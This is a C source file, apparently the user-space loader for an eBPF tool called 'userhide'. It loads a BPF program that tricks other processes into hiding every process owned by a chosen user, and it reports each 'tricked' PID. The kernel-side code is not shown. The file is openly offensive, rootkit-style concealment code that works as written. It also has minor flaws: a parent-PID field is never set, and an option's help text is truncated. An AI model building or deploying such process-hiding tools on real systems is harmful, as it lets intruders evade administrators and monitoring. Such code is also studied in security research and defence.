// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include "userhide.skel.h"
#include "common_um.h"
#include "common.h"
#include <pwd.h>

#define INVALID_UID  -1
// https://stackoverflow.com/questions/3836365/how-can-i-get-the-user-id-associated-with-a-login-on-linux
uid_t lookup_user(const char *name)
{
    if(name) {
        struct passwd *pwd = getpwnam(name); /* don't free, see getpwnam() for details */
        if(pwd) return pwd->pw_uid;
    }
  return INVALID_UID;
}

// Setup Argument stuff
#define max_username_len 20
static struct env {
    char username[max_username_len];
    int target_ppid;
} env;

const char *argp_program_version = "userhide 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"UserHide\n"
"\n"
"Hide all processes owned by the given user (by UID).\n"
"\n"
"USAGE: ./userhide -u USERNAME\n";

static const struct argp_option opts[] = {
    { "username", 'u', "USERNAME", 0, "Username of user to " },
    {},
};
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'u':
        if (strlen(arg) >= max_username_len) {
            fprintf(stderr, "Username must be less than %d characters\n", max_username_len);
            argp_usage(state);
        }
        strncpy(env.username, arg, sizeof(env.username));
        break;
    case 'h':
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Tricked PID %d to hide user\n", e->pid);
    else
        printf("Failed to trick PID %d to hide user\n", e->pid);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct userhide_bpf *skel;
    int err;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) {
        return err;
    }
    if (env.username[0] == '\x00') {
        printf("Username Requried, see %s --help\n", argv[0]);
        exit(1);
    }

    // Do common setup
    if (!setup()) {
        exit(1);
    }

    // Open BPF application 
    skel = userhide_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Let bpf program know our pid so we don't get kiled by it
    skel->rodata->target_ppid = env.target_ppid;

    strncpy(skel->rodata->username, env.username, sizeof(skel->rodata->username));
    skel->rodata->username_len = strlen(skel->rodata->username);


    // Verify and load program
    err = userhide_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    // Attach tracepoint handler 
    err = userhide_bpf__attach( skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    userhide_bpf__destroy( skel);
    return -err;
}
